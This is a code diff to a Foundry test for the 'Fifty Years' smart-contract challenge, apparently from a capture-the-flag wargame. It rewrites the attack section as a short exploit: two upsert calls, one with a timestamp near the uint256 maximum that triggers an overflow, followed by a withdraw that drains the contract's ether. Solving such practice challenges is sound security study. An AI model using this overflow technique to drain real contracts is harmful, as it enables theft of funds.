@@ -18,19 +18,19 @@ contract FiftyYearsTest is Test {
         /****************
          * Factory setup *
          *************** */
-        FiftyYearsChallenge fiftyYearsChallenge = new FiftyYearsChallenge{value: 1 ether}(player);
+        FiftyYearsChallenge fiftyYearsChallenge = new FiftyYearsChallenge{
+            value: 1 ether
+        }(player);
         vm.startPrank(player);
         uint256 initialPlayerBalance = player.balance;
         assertEq(initialPlayerBalance, 5 ether);
         /****************
          *    Attack     *
          *************** */
-        /*
-         * Goal:
-         */
-        fiftyYearsChallenge.upsert{value: 1}(6666, type(uint256).max - 1 days + 1);
-        fiftyYearsChallenge.upsert{value: 1}(6666, 0);
-        fiftyYearsChallenge.withdraw(1);
+        vm.warp(1576896401);
+        fiftyYearsChallenge.upsert{value: 1}(1, type(uint256).max - 1 days + 1);
+        fiftyYearsChallenge.upsert{value: 2}(2, 0);
+        fiftyYearsChallenge.withdraw(2);
 
         /*****************
          *Level Submission*
